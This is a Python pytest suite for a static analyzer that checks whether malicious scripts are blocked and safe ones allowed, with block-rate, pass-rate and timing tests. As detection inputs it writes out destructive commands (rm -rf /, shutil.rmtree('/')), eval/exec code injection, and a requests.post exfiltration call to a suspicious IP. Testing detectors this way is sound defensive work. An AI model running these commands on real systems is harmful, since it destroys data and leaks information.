"""
PoC 5: Pre-Crime Security Test Suite

Validates:
1. 50 malicious scripts → 100% block rate
2. 50 safe scripts → 100% pass rate
3. Zero false negatives for known malicious patterns
4. Zero false positives for known safe patterns

This is the CRITICAL security PoC. If this fails, the entire architecture 
claim of "pre-crime" security detection is invalidated.
"""

import sys
import os
import json
import time
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
from precrime_analyzer import PreCrimeSecurityAnalyzer, create_test_fixtures


BOLD = '\033[1m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'


# Ensure test fixtures are created
create_test_fixtures()


class TestPreCrimeSecurity:

    @pytest.fixture
    def analyzer(self):
        return PreCrimeSecurityAnalyzer(block_threshold=6)

    def test_0_analyzer_initialization(self, analyzer):
        """Test that the analyzer initializes correctly."""
        assert analyzer.block_threshold == 6
        assert analyzer.threats == []
        assert analyzer.blocked == False

    # ============ MALICIOUS TESTS (must block ALL) ============
    
    @pytest.mark.parametrize("fname", sorted(os.listdir(
        os.path.join(os.path.dirname(__file__), '..', 'fixtures', 'malicious')
    )))
    def test_malicious_scripts_blocked(self, analyzer, fname):
        """Test that ALL 50 malicious scripts are blocked."""
        fixture_path = os.path.join(
            os.path.dirname(__file__), '..', 'fixtures', 'malicious', fname
        )
        with open(fixture_path, 'r') as f:
            code = f.read()
        
        result = analyzer.analyze(code)
        
        assert result['blocked'] == True, (
            f"FAILED TO BLOCK: {fname}\n"
            f"  threats: {result['threat_count']}\n"
            f"  score: {result['score']}\n"
            f"  {json.dumps(result['threats'], indent=2)}"
        )

    # ============ SAFE TESTS (must pass ALL) ============
    
    @pytest.mark.parametrize("fname", sorted(os.listdir(
        os.path.join(os.path.dirname(__file__), '..', 'fixtures', 'safe')
    )))
    def test_safe_scripts_allowed(self, analyzer, fname):
        """Test that ALL 50 safe scripts are allowed (not blocked)."""
        fixture_path = os.path.join(
            os.path.dirname(__file__), '..', 'fixtures', 'safe', fname
        )
        with open(fixture_path, 'r') as f:
            code = f.read()
        
        result = analyzer.analyze(code)
        
        # Safe scripts should NOT be blocked (they may have warnings, but none block)
        assert result['blocked'] == False, (
            f"FALSE POSITIVE: {fname}\n"
            f"  blocked: {result['blocked']}\n"
            f"  threats: {result['threat_count']}\n"
            f"  {json.dumps(result['threats'], indent=2)}"
        )

    # ============ SPECIFIC THREAT DETECTION ============
    
    def test_detect_destructive_command(self, analyzer):
        """Detect os.system with destructive commands."""
        result = analyzer.analyze('import os\nos.system("rm -rf /")')
        assert result['blocked'], "Should block rm -rf /"

    def test_detect_shell_injection(self, analyzer):
        """Detect subprocess with shell=True."""
        result = analyzer.analyze('import subprocess\nsubprocess.call("rm -rf /", shell=True)')
        assert result['blocked'], "Should block shell=True subprocess"

    def test_detect_code_injection_exec(self, analyzer):
        """Detect exec() calls."""
        result = analyzer.analyze('exec("malicious code")')
        assert result['blocked'], "Should block exec()"

    def test_detect_code_injection_eval(self, analyzer):
        """Detect eval() calls."""
        result = analyzer.analyze("""eval('__import__("os").system("id")')""")
        assert result['blocked'], "Should block eval()"

    def test_detect_data_exfiltration(self, analyzer):
        """Detect requests.post to suspicious IP."""
        result = analyzer.analyze(
            'import requests\nrequests.post("http://185.234.72.0:8080/upload")'
        )
        assert result['blocked'], "Should block data exfiltration to suspicious IP"

    def test_detect_shutil_rmtree(self, analyzer):
        """Detect shutil.rmtree with dangerous paths."""
        result = analyzer.analyze('import shutil\nshutil.rmtree("/")')
        assert result['blocked'], "Should block shutil.rmtree on root"

    # ============ SPECIFIC SAFE CODE VERIFICATION ============
    
    def test_allow_safe_subprocess(self, analyzer):
        """Allow subprocess with list args (no shell=True)."""
        result = analyzer.analyze(
            'import subprocess\nsubprocess.run(["ls", "-la"], capture_output=True)'
        )
        assert not result['blocked'], "Should allow subprocess with list args"

    def test_allow_safe_file_read(self, analyzer):
        """Allow file read operations."""
        result = analyzer.analyze('with open("file.txt", "r") as f:\n    print(f.read())')
        assert not result['blocked'], "Should allow safe file reads"

    def test_allow_requests_to_github(self, analyzer):
        """Allow requests to legitimate APIs."""
        result = analyzer.analyze(
            'import requests\nr = requests.get("https://api.github.com")'
        )
        assert not result['blocked'], "Should allow requests to legitimate URLs"

    def test_allow_tempfile_cleanup(self, analyzer):
        """Allow os.remove with temp files."""
        result = analyzer.analyze(
            'import os\ntmp = "/tmp/test.txt"\nos.remove(tmp)'
        )
        assert not result['blocked'], "Should allow os.remove on temp files"

    # ============ PERFORMANCE ============
    
    def test_analysis_performance(self, analyzer):
        """Test that analysis completes in < 50ms per script."""
        test_code = """
import json
import os
from typing import List, Optional

def process_data(items: List[str]) -> dict:
    result = {}
    for item in items:
        result[item] = len(item)
    return result

class DataProcessor:
    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}
    
    def run(self):
        return process_data(["hello", "world", "test"])
        """
        
        times = []
        for _ in range(10):
            t0 = time.time()
            analyzer.analyze(test_code)
            times.append((time.time() - t0) * 1000)
        
        avg_time = sum(times) / len(times)
        assert avg_time < 50, f"Analysis too slow: {avg_time:.2f}ms avg (limit: 50ms)"

    def test_all_malicious_block_rate(self, analyzer):
        """QUANTITATIVE: Assert 100% block rate on all 50 malicious scripts."""
        malicious_dir = os.path.join(
            os.path.dirname(__file__), '..', 'fixtures', 'malicious'
        )
        files = sorted(os.listdir(malicious_dir))
        assert len(files) == 50, f"Expected 50 malicious fixtures, found {len(files)}"
        
        blocked = 0
        for fname in files:
            with open(os.path.join(malicious_dir, fname)) as f:
                result = analyzer.analyze(f.read())
            if result['blocked']:
                blocked += 1
        
        block_rate = (blocked / len(files)) * 100
        print(f"\n  {CYAN}Malicious block rate: {blocked}/{len(files)} = {block_rate:.1f}%{RESET}")
        assert block_rate == 100.0, f"Block rate {block_rate:.1f}% != 100%"

    def test_all_safe_pass_rate(self, analyzer):
        """QUANTITATIVE: Assert 100% pass rate on all 50 safe scripts."""
        safe_dir = os.path.join(
            os.path.dirname(__file__), '..', 'fixtures', 'safe'
        )
        files = sorted(os.listdir(safe_dir))
        assert len(files) == 50, f"Expected 50 safe fixtures, found {len(files)}"
        
        passed = 0
        false_positives = []
        for fname in files:
            with open(os.path.join(safe_dir, fname)) as f:
                result = analyzer.analyze(f.read())
            if not result['blocked']:
                passed += 1
            else:
                false_positives.append(fname)
        
        pass_rate = (passed / len(files)) * 100
        print(f"\n  {CYAN}Safe pass rate: {passed}/{len(files)} = {pass_rate:.1f}%{RESET}")
        
        if false_positives:
            print(f"  {RED}False positives:{RESET}")
            for fp in false_positives:
                print(f"    - {fp}")
        
        assert pass_rate == 100.0, f"Pass rate {pass_rate:.1f}% != 100%. FPs: {false_positives}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=long", "-x"])
